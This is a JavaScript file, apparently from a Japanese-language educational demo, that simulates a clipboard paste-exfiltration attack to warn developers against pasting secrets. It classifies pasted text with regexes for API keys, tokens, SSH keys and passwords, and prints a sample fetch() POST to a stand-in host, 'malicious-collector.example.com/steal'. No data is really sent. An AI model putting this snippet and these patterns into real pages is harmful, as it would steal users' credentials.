// autopaste.js - 自動送信攻撃シミュレーション

window.addEventListener("DOMContentLoaded", () => {
  const autoInput = document.getElementById("autoInput");
  const autoLog = document.getElementById("autoLog");
  let attackStep = 0;
  let autoTutorialStep = 1;

  function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }

  function showAttackStep(step, title, content, type = 'info') {
    const timestamp = new Date().toLocaleTimeString('ja-JP');
    const icons = {
      info: '📋',
      warning: '⚠️',
      danger: '🚨',
      success: '✅'
    };
    const icon = icons[type] || icons.info;

    autoLog.innerHTML += `
      <div class="clipboard-result">
        <div class="action-info">
          <span class="action">${icon} ステップ${step}: ${title}</span>
          <span class="timestamp">${timestamp}</span>
        </div>
        <div class="content-info">
          <div class="preview">${content}</div>
        </div>
      </div>
    `;
    
    // 自動スクロール
    autoLog.scrollTop = autoLog.scrollHeight;
  }

  function detectDataType(text) {
    // 開発者向けデータの検出
    if (/^sk-[a-zA-Z0-9]{40,}$/.test(text)) return 'OpenAI APIキー';
    if (/^xoxb-[a-zA-Z0-9-]+$/.test(text)) return 'Slack Bot Token';
    if (/^ghp_[a-zA-Z0-9]{36}$/.test(text)) return 'GitHub Personal Access Token';
    if (/^[A-Za-z0-9]{32,}$/.test(text) && text.length >= 32) return 'APIキー/トークン';
    if (/^export\s+\w+\s*=/.test(text)) return '環境変数設定';
    if (/DATABASE_URL|DB_PASSWORD|SECRET_KEY|PRIVATE_KEY/i.test(text)) return '機密設定情報';
    if (/^-----BEGIN [A-Z ]+-----/.test(text)) return 'SSH秘密鍵';
    if (/^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$/i.test(text)) return 'メールアドレス';
    if (/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[A-Za-z\d@$!%*?&]{8,}$/i.test(text)) return 'パスワード';
    if (/https?:\/\//.test(text)) return 'URL';
    return 'テキスト';
  }

  autoInput.addEventListener("paste", (event) => {
    const pasted = event.clipboardData.getData("text");
    const escapedText = escapeHtml(pasted);
    const dataType = detectDataType(pasted);
    attackStep = 0;

    // 新しい攻撃開始時にログをクリア
    autoLog.innerHTML = '';

    // チュートリアル進行
    if (autoTutorialStep === 3) {
      updateAutoTutorialStep(4);
    }

    // ステップ1: pasteイベント検知
    setTimeout(() => {
      attackStep++;
      showAttackStep(1, "pasteイベント検知",
        "ユーザーの貼り付け操作を検知しました。<br>この瞬間から攻撃が開始されます。", 'warning');
    }, 100);

    // ステップ2: データ抽出・分析
    setTimeout(() => {
      attackStep++;
      showAttackStep(2, "データ抽出・分析",
        `クリップボードから機密データを抽出中...<br>
         <div style="background: #ffebee; color: #c62828; padding: 0.5rem; border-radius: 4px; margin: 0.5rem 0;">
           <strong>抽出されたデータ:</strong><br>
           内容: <code>${escapedText}</code><br>
           データタイプ: ${dataType}<br>
           文字数: ${pasted.length}
         </div>
         <strong>⚠️ 危険度判定:</strong> ${
           dataType.includes('APIキー') || dataType.includes('Token') || dataType === 'SSH秘密鍵' || dataType === '機密設定情報' ? '🔴 最高危険' : 
           dataType === 'パスワード' || dataType === '環境変数設定' ? '🟠 高危険' : 
           '🟡 中危険'
         }`, 'danger');
    }, 1500);

    // ステップ3: 外部サーバーへ送信
    setTimeout(() => {
      attackStep++;
      showAttackStep(3, "外部サーバーへ自動送信",
        `攻撃者のサーバーへ自動送信中...<br>
         <div style="background: #fff3cd; border: 1px solid #ffeaa7; padding: 0.5rem; margin: 0.5rem 0; border-radius: 4px;">
           <strong>送信先:</strong> https://malicious-collector.example.com/steal<br>
           <strong>送信方法:</strong> fetch() POST リクエスト<br>
           <strong>送信データ:</strong> JSON形式でエンコード済み<br>
           <strong>状態:</strong> <span style="color: #28a745;">送信完了 ✓</span>
         </div>
         <strong>実際のコード例:</strong><br>
         <pre style="background: #f8f9fa; padding: 0.8rem; border-radius: 4px; font-size: 0.8rem; margin: 0.5rem 0; overflow-x: auto; white-space: pre-wrap;"><code>fetch("https://malicious-collector.example.com/steal", {
  method: "POST",
  body: JSON.stringify({
    data: "${escapedText}", 
    type: "${dataType}"
  })
});</code></pre>`, 'danger');
    }, 3000);

    // ステップ4: 攻撃完了と教育的解説
    setTimeout(() => {
      attackStep++;
      showAttackStep(4, "攻撃完了と影響分析",
        `<div style="background: #e8f5e9; border: 1px solid #4caf50; padding: 1rem; margin: 0.5rem 0; border-radius: 4px;">
           <strong>🎓 攻撃完了 - 学習ポイント:</strong><br>
           • 一回の貼り付けで機密情報が盗取完了<br>
           • ユーザーは攻撃に全く気づかない<br>
           • ${dataType}の漏洩により以下のリスクが発生:<br>
           ${
             dataType.includes('APIキー') || dataType.includes('Token') ? '&nbsp;&nbsp;→ サービス不正利用、高額課金、データ漏洩' :
             dataType === 'SSH秘密鍵' ? '&nbsp;&nbsp;→ サーバー侵入、システム全体の乗っ取り' :
             dataType === '機密設定情報' ? '&nbsp;&nbsp;→ データベース侵入、顧客情報漏洩' :
             dataType === '環境変数設定' ? '&nbsp;&nbsp;→ 本番環境への不正アクセス、設定改ざん' :
             dataType === 'パスワード' ? '&nbsp;&nbsp;→ アカウント乗っ取り、不正ログイン' :
             '&nbsp;&nbsp;→ プライバシー侵害、情報悪用'
           }<br><br>
           <strong>🛡️ 対策の重要性:</strong><br>
           信頼できないサイトでは貴重な情報を貼り付けないことが重要です。
         </div>`, 'success');
      
      // チュートリアル進行：ステップ4でOKボタンを表示
      if (autoTutorialStep === 4) {
        const step4Button = document.querySelector('#auto-step4 .step-ok-button');
        if (step4Button) {
          step4Button.style.display = 'inline-block';
        }
      }
    }, 4500);

    // 実際の送信は行わないが、シミュレーションとしてコンソール出力
    console.log("Auto-sent (simulated):", {
      data: pasted,
      type: dataType,
      timestamp: new Date().toISOString()
    });
  });

  // チュートリアル機能
  function updateAutoTutorialStep(stepNumber) {
    document.querySelectorAll('#tab-autopaste .step').forEach((step, index) => {
      step.classList.remove('active');
      if (index < stepNumber - 1) {
        step.classList.add('completed');
      }
    });
    
    const currentStep = document.getElementById(`auto-step${stepNumber}`);
    if (currentStep) {
      currentStep.classList.add('active');
    }
    autoTutorialStep = stepNumber;
  }

  window.selectAutoText = function(element) {
    const selection = window.getSelection();
    const range = document.createRange();
    range.selectNodeContents(element);
    selection.removeAllRanges();
    selection.addRange(range);
    element.classList.add('selected');
    setTimeout(() => {
      element.classList.remove('selected');
    }, 2000);
    
    // ステップ2完了、ステップ3へ
    if (autoTutorialStep === 2) {
      updateAutoTutorialStep(3);
    }
  };

  window.confirmAutoStep1 = function() {
    // ステップ1完了、ステップ2へ進む
    updateAutoTutorialStep(2);
    
    // OKボタンを非表示にする
    const okButton = document.querySelector('#auto-step1 .step-ok-button');
    if (okButton) {
      okButton.style.display = 'none';
    }
  };

  window.confirmAutoStep4 = function() {
    // ステップ4完了、チュートリアル終了
    document.getElementById('auto-step4').classList.add('completed');
    document.getElementById('auto-step4').classList.remove('active');
    
    // OKボタンを非表示にする
    const okButton = document.querySelector('#auto-step4 .step-ok-button');
    if (okButton) {
      okButton.style.display = 'none';
    }
    
    // 完了メッセージを専用領域に表示
    const celebrationDiv = document.getElementById('autoCelebrationMessage');
    celebrationDiv.innerHTML = `
      <div class="clipboard-result">
        <div class="action-info">
          <span class="action">🎉 自動送信攻撃チュートリアル完了！</span>
          <span class="timestamp">${new Date().toLocaleTimeString('ja-JP')}</span>
        </div>
        <div class="content-info">
          <div class="preview" style="background: #e8f5e9; color: #2e7d32; border: 1px solid #4caf50;">
            <strong>🎓 完璧！自動送信攻撃の危険性を完全理解しました！</strong><br>
            ✅ 即座に外部送信される仕組みを理解<br>
            ✅ 開発者が狙われやすいデータタイプを認識<br>
            ✅ pasteスニフィングとの違いを把握<br>
            ✅ リアルタイム送信の深刻さを体験<br><br>
            <strong>🛡️ 開発者として重要な教訓：</strong><br>
            信頼できないサイトではAPIキーや設定情報を貼り付けないよう注意しましょう！
          </div>
        </div>
      </div>
    `;
    celebrationDiv.style.display = 'block';
  };

  window.resetAutoTutorial = function() {
    document.querySelectorAll('#tab-autopaste .step').forEach(step => {
      step.classList.remove('completed', 'active');
    });
    document.getElementById('auto-step1').classList.add('active');
    autoTutorialStep = 1;
    
    // 全てのOKボタンを適切な状態にリセット
    const step1Button = document.querySelector('#auto-step1 .step-ok-button');
    if (step1Button) {
      step1Button.style.display = 'inline-block'; // ステップ1のボタンは表示
    }
    
    const step4Button = document.querySelector('#auto-step4 .step-ok-button');
    if (step4Button) {
      step4Button.style.display = 'none'; // ステップ4のボタンは非表示
    }
    
    // お祝いメッセージを非表示にする
    const celebrationDiv = document.getElementById('autoCelebrationMessage');
    if (celebrationDiv) {
      celebrationDiv.style.display = 'none';
    }
    
    // ログをリセット
    autoLog.innerHTML = '<div class="message info">📋 チュートリアルをリセットしました。ステップ1から始めましょう！</div>';
  };

  // デモリセット機能
  window.resetAutoDemo = function() {
    attackStep = 0;
    autoLog.innerHTML = '<div class="message info">📋 デモをリセットしました。上の入力欄に何かを貼り付けて、自動送信攻撃を体験してください。</div>';
    
    // 入力欄をクリア
    autoInput.value = '';
    
    // お祝いメッセージを非表示
    const celebrationDiv = document.getElementById('autoCelebrationMessage');
    if (celebrationDiv) {
      celebrationDiv.style.display = 'none';
    }
  };

  // アコーディオン機能
  window.toggleAutoAccordion = function() {
    const header = document.querySelector('#autoAccordionContent').previousElementSibling;
    const content = document.getElementById('autoAccordionContent');
    const icon = header.querySelector('.accordion-icon');
    
    header.classList.toggle('active');
    content.classList.toggle('open');
    
    if (content.classList.contains('open')) {
      icon.textContent = '▲';
    } else {
      icon.textContent = '▼';
    }
  };

  // 初期化
  autoLog.innerHTML = '<div class="message info">📋 上の入力欄に何かを貼り付けて、自動送信攻撃を体験してください。</div>';
  document.getElementById('auto-step1').classList.add('active');
  
  // ステップ1のボタンを初期表示
  const step1Button = document.querySelector('#auto-step1 .step-ok-button');
  if (step1Button) {
    step1Button.style.display = 'inline-block';
  }
});
